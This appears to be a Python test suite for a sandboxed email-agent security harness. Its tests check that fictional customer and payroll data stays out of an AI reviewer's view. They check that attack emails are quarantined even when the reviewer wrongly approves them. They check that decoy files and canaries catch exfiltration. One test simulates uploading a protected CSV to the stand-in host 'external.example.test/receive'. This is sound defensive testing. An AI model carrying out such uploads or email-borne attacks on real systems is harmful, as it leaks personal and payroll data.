from copy import deepcopy
import csv
import io
import json
from pathlib import Path
import sys
import unittest
from unittest.mock import patch
import uuid

from broker import Broker
from datasets import SCENARIOS, TOPICS, CUSTOMERS, PAYROLL
from mail_ai import ATTACK_TYPES, create_email, review_email
from runner import AgentRun
from security import SecurityViolation, extract_links
from shadow import ShadowPC
from simulation import MiniPC, new_mail


class DatasetTests(unittest.TestCase):
    def setUp(self):
        self.directory = Path(__file__).parent / ('run_' + uuid.uuid4().hex)
        self.directory.mkdir()
        self.pc = MiniPC(self.directory / 'pc.json')

    def tearDown(self):
        for file in self.directory.iterdir():
            file.unlink()
        self.directory.rmdir()

    def generate(self, scenario, attack=None):
        def choose(options):
            if options == SCENARIOS:
                return scenario
            if options == ATTACK_TYPES:
                return attack
            return options[0]
        def response(system, payload, schema, temperature):
            self.assertIn(payload['topic'], TOPICS[scenario])
            # Neither the malicious label nor any protected record is passed to the writer.
            encoded = json.dumps(payload)
            self.assertNotIn('generation_attack', encoded)
            self.assertNotIn('generation_scenario', encoded)
            for path in (CUSTOMERS, PAYROLL):
                rows = list(csv.reader(io.StringIO(self.pc.lookup(path)['content'])))
                for row in rows[1:]:
                    self.assertNotIn(row[0], encoded)
                    self.assertNotIn(row[2], encoded)
            return dict(subject='Coordination for next week', sender='ignored@untrusted.invalid',
                        body=f"Hi {payload['recipient_name']}, here are the [updated notes]({payload['provided_shared_url']}). Thanks, {payload['sender_name']}.")
        with patch('mail_ai.next_format', return_value='tool_attack'), patch('mail_ai.secrets.randbelow', return_value=0 if attack else 99), patch('mail_ai.secrets.choice', side_effect=choose), patch('mail_ai.generate_json', side_effect=response):
            return create_email(self.pc)

    def test_structured_fictional_records_and_public_briefs(self):
        for scenario, path, count in [('customers', CUSTOMERS, 12), ('payroll', PAYROLL, 8)]:
            file = self.pc.lookup(path)
            self.assertTrue(file['secret'])
            rows = list(csv.DictReader(io.StringIO(file['content'])))
            self.assertEqual(len(rows), count)
            self.assertTrue(all(row['email'].endswith('.example.test') for row in rows))
            self.assertEqual(len(self.pc.scenario_files(scenario)), 1)
            self.assertEqual(len(self.pc.scenario_files(scenario, protected=True)), 1)
            public_text = self.pc.lookup(self.pc.scenario_files(scenario)[0]['path'])['content']
            self.assertTrue(all(row['email'] not in public_text for row in rows))

    def test_upgrade_is_additive_and_stable(self):
        # Mimic the previous version while preserving old history and hidden-key values.
        self.pc.state['files'] = [f for f in self.pc.state['files'] if not f.get('dataset')]
        self.pc.state.pop('account')
        self.pc.state['quarantine'] = [new_mail('Keep this message', 'Old mail')]
        self.pc.state['investigations'] = [dict(id='old-report')]
        url = self.pc.create_link(self.pc.state['files'][0]['path'])
        before = deepcopy(self.pc.state)
        self.pc.save()
        upgraded = MiniPC(self.pc.path)
        self.assertEqual(upgraded.state['files'][:5], before['files'])
        self.assertEqual(upgraded.state['quarantine'], before['quarantine'])
        self.assertEqual(upgraded.state['investigations'], before['investigations'])
        self.assertIn(url, upgraded.state['links'])
        self.assertEqual(len(upgraded.state['files']), 9)
        self.assertEqual(MiniPC(self.pc.path).state, upgraded.state)
        account = deepcopy(upgraded.state['account'])
        files = deepcopy(upgraded.state['files'])
        upgraded.clear_mail()
        self.assertEqual(upgraded.state['account'], account)
        self.assertEqual(upgraded.state['files'], files)

    def test_safe_dataset_emails_open_only_public_briefs(self):
        for scenario in SCENARIOS:
            with self.subTest(scenario=scenario):
                mail = self.generate(scenario)
                url = extract_links(mail['body'])[0]
                self.assertEqual(mail['generation_scenario'], 'safe')
                self.assertEqual(mail['generation_dataset'], scenario)
                self.assertFalse(self.pc.resolve_link(url)['secret'])
                self.assertIn('content', Broker(self.pc, mail).dispatch('open_link', dict(url=url)))

    def test_every_business_attack_blocked_even_if_review_approves(self):
        original = deepcopy(self.pc.state['files'])
        for scenario in ('customers', 'payroll'):
            for attack in ATTACK_TYPES:
                with self.subTest(scenario=scenario, attack=attack):
                    generated = self.generate(scenario, attack)
                    url = extract_links(generated['body'])[0]
                    mail = new_mail('Fixture', 'FORCE_HIDDEN_LINK ' + url)
                    self.pc.state['inbox'].append(mail)
                    run = AgentRun(self.pc, mail, lambda event: None)
                    run.worker_command = [sys.executable, '-u', str(Path(__file__).with_name('worker_fixture.py'))]
                    with patch('runner.review_email', return_value=dict(verdict='safe', reason='Test a missed attack', target_files=[])):
                        run.start().thread.join(10)
                    self.assertFalse(run.thread.is_alive())
                    self.assertEqual(mail['status'], 'quarantined')
                    incident = self.pc.state['incidents'][-1]
                    self.assertTrue(incident['process_terminated'])
                    self.assertEqual(incident['secret_bytes_delivered'], 0)
                    self.assertEqual(incident['category'], 'protected_data_access' if attack == 'hidden_key_access' else attack)
                    expected = CUSTOMERS if scenario == 'customers' else PAYROLL
                    self.assertIn(expected, [file['path'] for file in incident['affected_files']])
        self.assertEqual(self.pc.state['files'], original)

    def test_reviewer_sees_manifest_and_operation_but_not_records_or_labels(self):
        for scenario in ('customers', 'payroll'):
            mail = self.generate(scenario, 'data_upload')
            with patch('mail_ai.generate_json', return_value=dict(verdict='malicious', reason='Upload', target_files=[])) as api:
                review_email(self.pc, mail)
            payload = api.call_args.args[1]
            self.assertEqual(len(payload['protected_files']), 5)
            encoded = json.dumps(payload)
            self.assertNotIn('generation_dataset', encoded)
            for path in (CUSTOMERS, PAYROLL):
                for row in list(csv.reader(io.StringIO(self.pc.lookup(path)['content'])))[1:]:
                    self.assertNotIn(row[0], encoded)
                    self.assertNotIn(row[2], encoded)

    def test_random_sender_addresses_and_consistent_random_mailbox(self):
        mails = [self.generate('customers') for _ in range(60)]
        self.assertEqual(len({mail['sender'] for mail in mails}), 60)
        self.assertTrue(all(mail['sender'].endswith('.example.test>') for mail in mails))
        self.assertTrue(all('untrusted.invalid' not in mail['sender'] for mail in mails))
        self.assertEqual({mail['recipient'] for mail in mails}, {self.pc.state['account']['address']})
        self.assertTrue(self.pc.state['account']['address'].endswith('.example.test'))

    def test_hidden_key_pool_still_has_exactly_three_equal_choice_candidates(self):
        candidates = self.pc.scenario_files('projects', protected=True)
        self.assertEqual([c['label'] for c in candidates], ['hidden key1', 'hidden key2', 'hidden key3'])
        self.assertFalse(any(c['path'] in (CUSTOMERS, PAYROLL) for c in candidates))

    def test_shadow_csv_replaces_every_cell_and_captures_trace_token(self):
        for path in (CUSTOMERS, PAYROLL):
            original = self.pc.lookup(path)['content']
            rows = list(csv.reader(io.StringIO(original)))
            # Also verify a single copied sensitive field is scrubbed from the email.
            mail = new_mail('Notes', 'Contact ' + rows[1][2])
            shadow = ShadowPC(self.pc, mail)
            decoy = shadow.file(path)['content']
            decoy_rows = list(csv.reader(io.StringIO(decoy)))
            self.assertEqual(len(rows), len(decoy_rows))
            self.assertEqual(decoy_rows[0][:-1], rows[0])
            for row in rows[1:]:
                for value in row:
                    self.assertNotIn(value, decoy)
            self.assertNotIn(rows[1][2], shadow.mail['body'])
            shadow.dispatch('upload_file', dict(path=path, destination='https://external.example.test/receive'))
            self.assertEqual(shadow.captures[0]['content'], decoy)
            self.assertEqual(shadow.captures[0]['canaries'][0]['path'], path)
            self.assertTrue(shadow.comparison(self.pc)[1])
            self.assertEqual(self.pc.lookup(path)['content'], original)


if __name__ == '__main__':
    unittest.main()
